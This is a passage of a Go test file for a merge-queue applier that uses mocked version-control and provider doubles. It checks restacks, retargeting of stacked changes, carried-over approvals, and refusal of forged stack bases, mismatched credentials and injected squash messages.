	d.lists(types.Changes{Base: "main", Changes: []types.Change{c}, Merged: []types.MergedChange{m}})
	d.vcs.EXPECT().RangeCommits(mock.Anything, clone.Root, base, m.Head, []string(nil)).Return([]magustypes.Commit{{ID: m.Head, Parents: []string{base}}}, nil).Once()
	d.vcs.EXPECT().FetchCommit(mock.Anything, clone.Root, clone.Remote, m.Commit).Return(nil).Once()
	d.vcs.EXPECT().IsAncestor(mock.Anything, clone.Root, m.Commit, base).Return(true, nil).Once()
	// The candidate is built with m recorded as merged into the base, so its natural
	// merge base is m's head.
	recorded := head("recorded")
	d.vcs.EXPECT().IsAncestor(mock.Anything, clone.Root, m.Head, base).Return(false, nil)
	d.vcs.EXPECT().FetchCommit(mock.Anything, clone.Root, clone.Remote, m.Head).Return(nil)
	d.vcs.EXPECT().TreeID(mock.Anything, clone.Root, base).Return("base tree", nil)
	d.vcs.EXPECT().CommitTree(mock.Anything, clone.Root, mock.MatchedBy(func(tc magustypes.TreeCommit) bool {
		return slices.Equal(tc.Parents, []string{base, m.Head})
	})).Return(recorded, nil)
	d.vcs.EXPECT().CreateCheckout(mock.Anything, clone.Root, mock.Anything, recorded).RunAndReturn(makeCheckout)
	d.vcs.EXPECT().StartMerge(mock.Anything, mock.Anything, c.Head, candidateIdentity).Return(nil)
	d.vcs.EXPECT().Conflicts(mock.Anything, mock.Anything).Return(nil, nil)
	d.vcs.EXPECT().Commit(mock.Anything, mock.Anything, magustypes.CheckoutCommit{CommitMeta: queueMeta("merge queue: candidate #"+c.ID, when)}).Return(v.CandidateCommit, nil)
	d.vcs.EXPECT().DiffTrees(mock.Anything, clone.Root, base, v.CandidateCommit).Return([]string{"lib/x.txt"}, nil)
	d.vcs.EXPECT().RemoveCheckout(mock.Anything, clone.Root, mock.Anything).Return(nil)
	d.vcs.EXPECT().TreeID(mock.Anything, clone.Root, v.CandidateCommit).Return("validated", nil)
	d.vcs.EXPECT().MergeTrees(mock.Anything, clone.Root, magustypes.TreeMerge{Ours: base, Theirs: c.Head}).Return(magustypes.TreeMergeResult{Tree: "plain"}, nil)
	d.vcs.EXPECT().DiffTrees(mock.Anything, clone.Root, "plain", "validated").Return([]string{"lib/x.txt"}, nil)
	d.facts.EXPECT().Classify(mock.Anything, []string{"lib/x.txt"}).Return(map[string]types.Writes{}, nil)
	d.vcs.EXPECT().MergeTrees(mock.Anything, clone.Root, magustypes.TreeMerge{Base: m.Head, Ours: base, Theirs: c.Head}).Return(magustypes.TreeMergeResult{Tree: "validated"}, nil)
	d.vcs.EXPECT().DiffTrees(mock.Anything, clone.Root, "validated", "validated").Return(nil, nil)
}

// A restack replaces the branch's commits with one holding their delta. That commit is
// the queue's: authored and committed by the committer, never passed off as the
// author's, and naming the head it replaces.
func TestARestackCommitIsTheQueuesAndNamesWhatItReplaces(t *testing.T) {
	m := types.MergedChange{ID: "9", Head: head("m9"), Commit: head("m9 on base"), Method: types.MethodSquash}
	c := change("1", "a")
	c.StackBase, c.Branch = m.Head, "feature"
	v := validated(c, base, "")
	plan := planOf([]types.Change{c})
	plan.Merged = []types.MergedChange{m}

	d := newDoubles(t)
	d.restacking(c, m, v)
	update, after := head("restack"), oid("after")
	d.vcs.EXPECT().CommitTree(mock.Anything, clone.Root, magustypes.TreeCommit{
		CommitMeta: magustypes.CommitMeta{
			Message: "restack #1 onto main\n\nReplaces " + c.Head + " and the commits beneath it that main lacks with one commit holding their delta onto " + base[:12] + ".",
			Author:  bot, Committer: bot,
		},
		Tree: "validated", Parents: []string{base}}).Return(update, nil)
	d.vcs.EXPECT().Push(mock.Anything, clone.Root, magustypes.PushLease{Remote: clone.Remote, Ref: "refs/heads/feature", To: update, Expected: c.Head}).Return(nil)
	d.provider.EXPECT().ApprovalAt(mock.Anything, mock.Anything, update).Return(types.Approval{Approved: true, Head: update, Base: "main", Method: c.Method, Queued: true}, nil)
	d.bases(base, after)
	d.green(c, update)
	d.mergesAt(c, update, squashOf(v.Change), after, "validated", base)
	a := applierFor(t, d, plan, v)
	require.NoError(t, a.Run(t.Context(), plan))
}

// A restack would leave a change stacked on the replaced head carrying commits no queued
// change holds any more, so then only the author restacks.
func TestARestackThatWouldOrphanAChangeAboveIsKickedBack(t *testing.T) {
	m := types.MergedChange{ID: "9", Head: head("m9"), Commit: head("m9 on base"), Method: types.MethodSquash}
	c := change("1", "a")
	c.StackBase, c.Branch = m.Head, "feature"
	above := stacked("2", c, "a")
	v := validated(c, base, "")
	plan := planOf([]types.Change{c, above})
	plan.Merged = []types.MergedChange{m}

	d := newDoubles(t)
	d.restacking(c, m, v)
	d.vcs.EXPECT().FetchCommit(mock.Anything, clone.Root, clone.Remote, above.Head).Return(nil)
	d.vcs.EXPECT().IsAncestor(mock.Anything, clone.Root, c.Head, above.Head).Return(true, nil)
	d.kicks(c, types.CodeKickRefused, "which would replace the commits #2 is stacked on")
	d.waits(above, above.Head, "not validated in this run")
	a := applierFor(t, d, plan, v)
	require.NoError(t, a.Run(t.Context(), plan))
}

// A change stacked on one that merged this run, still targeting that one's branch, is
// pointed at the base, approved again there, and merged.
func TestAStackedChangeTargetingTheBranchBeneathIsRetargetedOnceThatMergedAndMerges(t *testing.T) {
	one := change("1", "a")
	one.Branch = "feature-1"
	two := stacked("2", one, "a")
	v1 := validated(one, base, "")
	v2 := validated(two, v1.CandidateCommit, "1")
	cand1, cand2 := v1.CandidateCommit, v2.CandidateCommit
	after1, after2 := oid("after", "1"), oid("after", "2")
	plan := planOf([]types.Change{one, two})

	d := newDoubles(t)
	d.caps()
	d.cleanMerge(v1, types.MergeResult{})
	d.bases(after1, after1, after2)
	d.vcs.EXPECT().IsAncestor(mock.Anything, clone.Root, base, after1).Return(true, nil).Once()
	d.vcs.EXPECT().FetchCommit(mock.Anything, clone.Root, clone.Remote, two.Head).Return(nil)
	d.plain(two.Head)
	d.stackChecks(two)
	d.lists(types.Changes{Base: "main", Changes: []types.Change{one, two}})
	d.provider.EXPECT().ApprovalAt(mock.Anything, mock.Anything, two.Head).
		Return(types.Approval{Approved: true, Head: two.Head, Base: "feature-1", Method: types.MethodSquash, Queued: true}, nil).Once()
	retarget := d.provider.EXPECT().Retarget(mock.Anything, mock.MatchedBy(func(c types.Change) bool { return c.ID == "2" }), "main").Return(nil).Call
	d.provider.EXPECT().ApprovalAt(mock.Anything, mock.Anything, two.Head).Return(approvedAs(two), nil).Once().NotBefore(retarget)
	d.rebuilds(two, cand1, cand2, "a/y.go")
	d.vcs.EXPECT().IsAncestor(mock.Anything, clone.Root, one.Head, cand1).Return(true, nil)
	d.vcs.EXPECT().DiffTrees(mock.Anything, clone.Root, cand1, after1).Return(nil, nil)
	d.vcs.EXPECT().DiffTrees(mock.Anything, clone.Root, cand1, cand2).Return([]string{"a/y.go"}, nil).Once()
	d.vcs.EXPECT().MergeTrees(mock.Anything, clone.Root, magustypes.TreeMerge{Base: cand1, Ours: after1, Theirs: cand2}).Return(magustypes.TreeMergeResult{Tree: "tree 2"}, nil)
	d.vcs.EXPECT().MergeTrees(mock.Anything, clone.Root, magustypes.TreeMerge{Ours: after1, Theirs: two.Head}).Return(magustypes.TreeMergeResult{Tree: "tree 2"}, nil)
	d.provider.EXPECT().ApprovalAt(mock.Anything, mock.Anything, two.Head).Return(approvedAs(two), nil).Once()
	d.green(two, two.Head)
	d.mergesAt(two, two.Head, squashOf(v2.Change), after2, "tree 2", after1).NotBefore(retarget)
	a := applierFor(t, d, plan, v1, v2)
	require.NoError(t, a.Run(t.Context(), plan))
}

// A review of the commit beneath a merge of the base covers that merge only when the
// base's own regeneration, run on the plain merge, gives exactly the merge's tree.
func TestApplyProvesAReviewAcrossAMergeOfTheBaseByRegenerating(t *testing.T) {
	for name, tc := range map[string]struct {
		regenerated string
		merges      bool
	}{
		"the regeneration reproduces the merge": {regenerated: "merged tree", merges: true},
		"the merge holds something else":        {regenerated: "other tree"},
	} {
		t.Run(name, func(t *testing.T) {
			c := change("1", "a")
			v := validated(c, base, "")
			first, onBase := head("first"), head("on base")
			d := newDoubles(t)
			d.caps()
			d.vcs.EXPECT().FetchCommit(mock.Anything, clone.Root, clone.Remote, c.Head).Return(nil)
			// The head is a merge of the base into first that differs from their plain
			// merge in a declared output, so the review at first covers it once proven.
			d.vcs.EXPECT().FindCommit(mock.Anything, clone.Root, c.Head).Return(magustypes.Commit{ID: c.Head, Parents: []string{first, onBase}, Date: when}, nil)
			d.vcs.EXPECT().IsAncestor(mock.Anything, clone.Root, onBase, base).Return(true, nil)
			d.vcs.EXPECT().TreeID(mock.Anything, clone.Root, c.Head).Return("merged tree", nil)
			d.vcs.EXPECT().MergeTrees(mock.Anything, clone.Root, magustypes.TreeMerge{Ours: onBase, Theirs: first}).Return(magustypes.TreeMergeResult{Tree: "plain"}, nil)
			d.vcs.EXPECT().DiffTrees(mock.Anything, clone.Root, "plain", "merged tree").Return([]string{"gen/x.go"}, nil)
			d.facts.EXPECT().Classify(mock.Anything, []string{"gen/x.go"}).Return(map[string]types.Writes{"gen/x.go": {Output: true}}, nil)
			d.plain(first)
			d.provider.EXPECT().ApprovalAt(mock.Anything, mock.Anything, first).Return(approvedAs(c), nil)
			d.rebuilds(c, base, v.CandidateCommit, "a/x.go")
			// The proof: main's regeneration, proven to run none of the change's code, on
			// the plain merge.
			plain := head("plain merge")
			d.vcs.EXPECT().CommitTree(mock.Anything, clone.Root, magustypes.TreeCommit{CommitMeta: queueMeta("merge queue: plain merge of "+c.Head[:12], when),
				Tree: "plain", Parents: []string{first, onBase}}).Return(plain, nil)
			d.vcs.EXPECT().RangeFiles(mock.Anything, clone.Root, base, c.Head, []string(nil)).Return([]string{"a/x.go"}, nil)
			// The regeneration runs on the older base the merge brought in, whose
			// declarations the facts do not answer for, so its span to the base is proven.
			d.vcs.EXPECT().DiffTrees(mock.Anything, clone.Root, base, onBase).Return([]string{"docs/x.md"}, nil)
			d.vcs.EXPECT().DiffTrees(mock.Anything, clone.Root, onBase, plain).Return([]string{"a/x.go", "gen/x.go"}, nil)
			d.facts.EXPECT().Generation(mock.Anything, []string{"gen/x.go"}, []string{"a/x.go", "docs/x.md"}).Return(types.Generation{Units: []string{"gen"}}, nil)
			d.vcs.EXPECT().CreateCheckout(mock.Anything, clone.Root, mock.Anything, plain).RunAndReturn(makeCheckout)
			d.vcs.EXPECT().DirtyFiles(mock.Anything, mock.Anything, []string(nil)).Return([]string{"gen/x.go"}, nil)
			regenerated := head("regenerated")
			d.vcs.EXPECT().Commit(mock.Anything, mock.Anything, magustypes.CheckoutCommit{CommitMeta: queueMeta("regenerate generated files", when), Paths: []string{"gen/x.go"}}).Return(regenerated, nil)
			d.vcs.EXPECT().RemoveCheckout(mock.Anything, clone.Root, mock.Anything).Return(nil).Once()
			d.vcs.EXPECT().TreeID(mock.Anything, clone.Root, regenerated).Return(tc.regenerated, nil)
			if tc.merges {
				after := oid("after")
				d.bases(base, base, after)
				d.vcs.EXPECT().TreeID(mock.Anything, clone.Root, v.CandidateCommit).Return("validated", nil)
				d.vcs.EXPECT().MergeTrees(mock.Anything, clone.Root, magustypes.TreeMerge{Ours: base, Theirs: c.Head}).Return(magustypes.TreeMergeResult{Tree: "validated"}, nil)
				d.provider.EXPECT().ApprovalAt(mock.Anything, mock.Anything, c.Head).Return(approvedAs(c), nil).Once()
				d.green(c, c.Head)
				d.mergesAt(c, c.Head, squashOf(v.Change), after, "validated", base)
			} else {
				d.bases(base)
				d.waits(c, c.Head, "not approved at "+c.Head[:12]+": `gen/x.go` are not what the base's regeneration makes of its plain merge")
			}
			var ran []types.Regeneration
			a := applierFor(t, d, planOf([]types.Change{c}), v)
			a.Regenerate = func(_ context.Context, r types.Regeneration) error {
				ran = append(ran, r)
				return nil
			}
			require.NoError(t, a.Run(t.Context(), planOf([]types.Change{c})))
			require.Len(t, ran, 1)
			assert.Equal(t, []string{"gen/x.go"}, ran[0].Paths)
			assert.Equal(t, []string{"gen"}, ran[0].Units)
		})
	}
}

// Approval at an older commit carries over in apply as in planning, read against the
// plan's merged and unqueued changes: a rebase that changed nothing carries it, and an
// older commit carrying an unqueued change's head does not.
func TestApplyCarriesAnApprovalOverARebaseAgainstThePlansChanges(t *testing.T) {
	m := types.MergedChange{ID: "9", Head: head("m9"), Commit: head("m9 on base"), Method: types.MethodSquash}
	u := types.UnqueuedChange{ID: "7", Head: head("u7")}
	old, b0 := head("old"), head("old base")
	for name, tc := range map[string]struct {
		old     []magustypes.Commit
		carried bool
	}{
		"a rebase that changed nothing":      {old: []magustypes.Commit{{ID: old, Parents: []string{b0}}}, carried: true},
		"an older commit carrying #7's head": {old: []magustypes.Commit{{ID: old, Parents: []string{u.Head}}, {ID: u.Head, Parents: []string{b0}}}},
	} {
		t.Run(name, func(t *testing.T) {
			c := change("1", "a")
			v := validated(c, base, "")
			plan := planOf([]types.Change{c})
			plan.Merged, plan.Unqueued = []types.MergedChange{m}, []types.UnqueuedChange{u}
			d := newDoubles(t)
			d.caps()
			d.vcs.EXPECT().FetchCommit(mock.Anything, clone.Root, clone.Remote, c.Head).Return(nil)
			d.plain(c.Head)
			d.provider.EXPECT().ApprovalAt(mock.Anything, mock.Anything, c.Head).
				Return(types.Approval{Head: c.Head, Base: "main", Method: types.MethodSquash, Queued: true, Reason: "stale", ApprovedCommit: old}, nil).Once()
			d.vcs.EXPECT().FetchCommit(mock.Anything, clone.Root, clone.Remote, old).Return(nil)
			d.vcs.EXPECT().RangeCommits(mock.Anything, clone.Root, base, old, []string(nil)).Return(tc.old, nil)
			// The merged change is read for its own commits; the unqueued one needs only its
			// head, and the change itself is the rebase being judged.
			d.vcs.EXPECT().FetchCommit(mock.Anything, clone.Root, clone.Remote, m.Head).Return(nil)
			d.vcs.EXPECT().RangeCommits(mock.Anything, clone.Root, base, m.Head, []string(nil)).Return([]magustypes.Commit{{ID: m.Head, Parents: []string{base}}}, nil)
			var out bytes.Buffer
			if tc.carried {
				after := oid("after")
				d.bases(base, base, after)
				d.vcs.EXPECT().RangeCommits(mock.Anything, clone.Root, base, c.Head, []string(nil)).Return([]magustypes.Commit{{ID: c.Head, Parents: []string{base}}}, nil).Once()
				d.vcs.EXPECT().MergeTrees(mock.Anything, clone.Root, magustypes.TreeMerge{Base: b0, Ours: base, Theirs: old}).Return(magustypes.TreeMergeResult{Tree: "rebased"}, nil)
				d.vcs.EXPECT().TreeID(mock.Anything, clone.Root, c.Head).Return("rebased", nil)
				d.rebuilds(c, base, v.CandidateCommit, "a/x.go")
				d.vcs.EXPECT().TreeID(mock.Anything, clone.Root, v.CandidateCommit).Return("validated", nil)
				d.vcs.EXPECT().MergeTrees(mock.Anything, clone.Root, magustypes.TreeMerge{Ours: base, Theirs: c.Head}).Return(magustypes.TreeMergeResult{Tree: "validated"}, nil)
				d.provider.EXPECT().ApprovalAt(mock.Anything, mock.Anything, c.Head).Return(approvedAs(c), nil).Once()
				d.green(c, c.Head)
				d.mergesAt(c, c.Head, squashOf(v.Change), after, "validated", base)
			} else {
				d.bases(base)
				d.waits(c, c.Head, "approval at "+c.Head[:12]+" was withdrawn: stale")
			}
			a := applierFor(t, d, plan, v)
			a.Events = NewEvents(&out)
			require.NoError(t, a.Run(t.Context(), plan))
			assert.Equal(t, tc.carried, strings.Contains(out.String(), "rebased with its diff unchanged, so its approval carried over"))
		})
	}
}

// A base requiring the queue's status from an integration other than the credential's
// counts none of the statuses apply would post, so apply refuses before it writes
// anything: no stale success is reset, no status posted.
func TestApplyRefusesAStatusPinnedToAnotherIntegration(t *testing.T) {
	for name, tc := range map[string]struct {
		app        string
		credential types.Integration
		pinned     string
	}{
		"pinned to GitHub Actions, holding the queue app's": {app: "acme-queue", credential: types.Integration{ID: "812", Name: "acme queue"}, pinned: "15368"},
		"pinned to another app, holding the queue app's":    {app: "acme-queue", credential: types.Integration{ID: "812", Name: "acme queue"}, pinned: "977"},
	} {
		t.Run(name, func(t *testing.T) {
			d := newDoubles(t)
			setup := &types.Setup{StatusContext: DefaultStatusContext, Credential: tc.credential,
				RequiredChecks: []types.RequiredCheck{{Context: "ci gate"}, {Context: DefaultStatusContext, Integration: tc.pinned}}}
			d.provider.EXPECT().Describe(mock.Anything, types.ListQuery{Base: "main", StatusContext: DefaultStatusContext, App: tc.app}).
				Return(types.Capabilities{StackMerge: types.StackMergeSequential, Methods: []types.MergeMethod{types.MethodSquash}, Setup: setup}, nil)
			a, err := NewApplier(d.vcs, clone, d.provider, d.src, d.facts, t.TempDir())
			require.NoError(t, err)
			a.Base, a.App = "main", tc.app
			err = a.Run(t.Context(), planOf([]types.Change{change("1", "a")}))
			var diag *magustypes.DiagnosticError
			require.ErrorAs(t, err, &diag)
			assert.Equal(t, magustypes.QueueCredentialMismatch, diag.Code)
			assert.ErrorContains(t, err, `main requires status "merge-queue" from integration `+tc.pinned+`, and the queue's credential posts it as `+tc.credential.String())
		})
	}
}

func TestCheckCredentialPassesWhatTheProviderCounts(t *testing.T) {
	app := types.Integration{ID: "812"}
	for name, s := range map[string]*types.Setup{
		"no setup reported": nil,
		"pinned to the credential": {StatusContext: "merge-queue", Credential: app,
			RequiredChecks: []types.RequiredCheck{{Context: "merge-queue", Integration: "812"}}},
		"required from anyone": {StatusContext: "merge-queue", Credential: app,
			RequiredChecks: []types.RequiredCheck{{Context: "merge-queue"}}},
		"not required": {StatusContext: "merge-queue", Credential: app},
		"another context pinned elsewhere": {StatusContext: "merge-queue", Credential: app,
			RequiredChecks: []types.RequiredCheck{{Context: "deploy", Integration: "977"}}},
	} {
		t.Run(name, func(t *testing.T) {
			assert.NoError(t, checkCredential(s, "main"))
		})
	}
}

func TestCheckCredentialRefusesAnAppWhoseIDIsNotKnown(t *testing.T) {
	s := &types.Setup{StatusContext: "merge-queue", Credential: types.Integration{Name: "magus-queue"}, App: &types.App{Slug: "magus-queue"}}
	assert.EqualError(t, checkCredential(s, "main"), "the provider could not read which integration the queue's credential posts its status as")
}

// requireUnverified asserts err is applying stopping on a plan it could not verify.
func requireUnverified(t *testing.T, err error, want string) {
	t.Helper()
	var diag *magustypes.DiagnosticError
	require.ErrorAs(t, err, &diag)
	assert.Equal(t, magustypes.QueuePlanUnverified, diag.Code)
	assert.ErrorContains(t, err, want)
}

// The base and the remote are apply's own. A plan naming others is refused before the
// provider is asked anything, so nothing is posted, reset or merged.
func TestApplyRefusesAPlanForAnotherBaseOrRemote(t *testing.T) {
	c := change("1", "a")
	for name, tc := range map[string]struct {
		base, remote string
		want         string
	}{
		"another base":   {base: "release", want: `the plan merges into "main", and this applier merges into "release"`},
		"another remote": {base: "main", remote: "https://github.com/acme/widgets", want: `the plan names remote "", and this applier's remote is "https://github.com/acme/widgets"`},
	} {
		t.Run(name, func(t *testing.T) {
			d := newDoubles(t)
			a, err := NewApplier(d.vcs, clone, d.provider, d.src, d.facts, t.TempDir())
			require.NoError(t, err)
			a.Base, a.RemoteURL = tc.base, tc.remote
			requireUnverified(t, a.Run(t.Context(), planOf([]types.Change{c})), tc.want)
		})
	}
	d := newDoubles(t)
	a, err := NewApplier(d.vcs, clone, d.provider, d.src, d.facts, t.TempDir())
	require.NoError(t, err)
	require.EqualError(t, a.Run(t.Context(), planOf([]types.Change{c})), "applier needs the base branch it merges into")
}

// Every candidate was built on the plan's base commit; a base that does not carry it is
// not the base the plan was made for, and nothing merges onto it.
func TestApplyRefusesABaseThatDoesNotCarryThePlansBaseCommit(t *testing.T) {
	d := newDoubles(t)
	c := change("1", "a")
	rewritten := head("rewritten")
	d.caps()
	d.bases(rewritten)
	d.vcs.EXPECT().IsAncestor(mock.Anything, clone.Root, base, rewritten).Return(false, nil).Once()
	a := applierFor(t, d, planOf([]types.Change{c}), validated(c, base, ""))
	requireUnverified(t, a.Run(t.Context(), planOf([]types.Change{c})), "the plan's base commit "+base[:12]+" is not on main at "+rewritten[:12])
}

// A stack base is where the delta a change's reviewers approved starts. Merging from any
// other commit merges a delta nobody reviewed: one carrying the base's tree would give
// the head's own tree, reverting everything the base gained since. So a stack base must
// be beneath the head, off the base, and the reviewed head of the change beneath.
func TestApplyRefusesAStackBaseThatIsNotTheReviewedHeadBeneath(t *testing.T) {
	forged := head("main's tree")
	for name, tc := range map[string]struct {
		answer func(d doubles, two types.Change)
		want   string
	}{
		"not beneath its head": {func(d doubles, two types.Change) {
			d.vcs.EXPECT().IsAncestor(mock.Anything, clone.Root, forged, two.Head).Return(false, nil).Once()
		}, "stack base " + forged[:12] + " is not beneath its head " + head("2")[:12]},
		"on the base": {func(d doubles, two types.Change) {
			d.vcs.EXPECT().IsAncestor(mock.Anything, clone.Root, forged, two.Head).Return(true, nil).Once()
			d.vcs.EXPECT().IsAncestor(mock.Anything, clone.Root, forged, base).Return(true, nil).Once()
		}, "stack base " + forged[:12] + " is already on main"},
		"not the head of the change beneath": {func(d doubles, two types.Change) {
			d.vcs.EXPECT().IsAncestor(mock.Anything, clone.Root, forged, two.Head).Return(true, nil).Once()
			d.vcs.EXPECT().IsAncestor(mock.Anything, clone.Root, forged, base).Return(false, nil).Once()
			d.lists(types.Changes{Base: "main", Changes: []types.Change{two}})
		}, "stack base " + forged[:12] + " is not " + head("1")[:12] + ", the head #1 was reviewed at"},
	} {
		t.Run(name, func(t *testing.T) {
			d := newDoubles(t)
			one := change("1", "a")
			two := stacked("2", one, "a")
			two.StackBase = forged
			v1, v2 := validated(one, base, ""), validated(two, candidateOf(base, one.Head), "1")
			plan := planOf([]types.Change{one, two})
			d.caps()
			d.cleanMerge(v1, types.MergeResult{})
			after := oid("after", "1")
			d.bases(after)
			d.vcs.EXPECT().IsAncestor(mock.Anything, clone.Root, base, after).Return(true, nil).Once()
			d.vcs.EXPECT().FetchCommit(mock.Anything, clone.Root, clone.Remote, two.Head).Return(nil).Once()
			tc.answer(d, two)
			a := applierFor(t, d, plan, v1, v2)
			requireUnverified(t, a.Run(t.Context(), plan), "the plan's stack of #2: "+tc.want)
		})
	}
}

// A change stacked on one that merged is measured from that change's own commit, which
// the provider must list as merged onto the base; any other commit is refused.
func TestApplyRefusesAStackBaseNoMergedChangeHolds(t *testing.T) {
	d := newDoubles(t)
	m := types.MergedChange{ID: "9", Head: head("m9"), Commit: head("m9 on base"), Method: types.MethodSquash}
	c := change("1", "a")
	c.StackBase = head("forged")
	d.caps()
	d.bases(base)
	d.vcs.EXPECT().FetchCommit(mock.Anything, clone.Root, clone.Remote, c.Head).Return(nil).Once()
	d.vcs.EXPECT().IsAncestor(mock.Anything, clone.Root, c.StackBase, c.Head).Return(true, nil).Once()
	d.vcs.EXPECT().IsAncestor(mock.Anything, clone.Root, c.StackBase, base).Return(false, nil).Once()
	d.lists(types.Changes{Base: "main", Changes: []types.Change{c}, Merged: []types.MergedChange{m}})
	d.vcs.EXPECT().FetchCommit(mock.Anything, clone.Root, clone.Remote, m.Head).Return(nil).Once()
	d.vcs.EXPECT().RangeCommits(mock.Anything, clone.Root, base, m.Head, []string(nil)).Return([]magustypes.Commit{{ID: m.Head, Parents: []string{base}}}, nil).Once()
	plan := planOf([]types.Change{c})
	a := applierFor(t, d, plan, validated(c, base, ""))
	requireUnverified(t, a.Run(t.Context(), plan), "stack base "+c.StackBase[:12]+" is neither the head of a change beneath it nor a commit of one the provider lists as merged")
}

// A stack the provider now declares differently than the plan's may have changed after
// planning, so the change waits rather than stopping the run.
func TestAStackTheProviderNowDeclaresDifferentlyWaits(t *testing.T) {
	d := newDoubles(t)
	one := change("1", "a")
	two := stacked("2", one, "a")
	v1, v2 := validated(one, base, ""), validated(two, candidateOf(base, one.Head), "1")
	plan := planOf([]types.Change{one, two})
	d.caps()
	d.cleanMerge(v1, types.MergeResult{})
	after := oid("after", "1")
	d.bases(after)
	d.vcs.EXPECT().IsAncestor(mock.Anything, clone.Root, base, after).Return(true, nil).Once()
	d.vcs.EXPECT().FetchCommit(mock.Anything, clone.Root, clone.Remote, two.Head).Return(nil).Once()
	d.stackChecks(two)
	moved := two
	moved.Parent = "5"
	d.lists(types.Changes{Base: "main", Changes: []types.Change{moved}})
	d.waits(two, two.Head, "the provider now says it is stacked on #5, not #1")
	a := applierFor(t, d, plan, v1, v2)
	require.NoError(t, a.Run(t.Context(), plan))
}

// The squash message is applying's own, from the change's commits: a validation job runs
// the change's code, so a message it wrote is the author's, and a verdict carrying one
// has it ignored.
func TestTheSquashMessageIsApplyingsOwnWhateverTheVerdictCarries(t *testing.T) {
	d := newDoubles(t)
	c := change("1", "a")
	var doc bytes.Buffer
	require.NoError(t, writeVerdict(&doc, validated(c, base, "")))
	forged := bytes.Replace(doc.Bytes(), []byte("{"), []byte(`{"message": "* revert main",`), 1)
	v, err := readVerdict(bytes.NewReader(forged))
	require.NoError(t, err)
	d.caps()
	d.cleanMerge(v, types.MergeResult{})
	a := applierFor(t, d, planOf([]types.Change{c}), v)
	require.NoError(t, a.Run(t.Context(), planOf([]types.Change{c})))
}
